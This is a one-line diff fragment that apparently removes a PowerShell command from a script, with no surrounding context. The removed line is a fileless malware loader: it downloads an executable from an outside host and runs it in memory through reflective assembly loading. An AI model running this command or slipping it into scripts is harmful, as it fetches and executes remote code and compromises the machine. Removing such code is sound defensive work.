@@ -1,1 +1,0 @@
-[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://nevergetcaught.xyz/loader.exe')).EntryPoint.Invoke($null, (, [string[]]::new(0)))
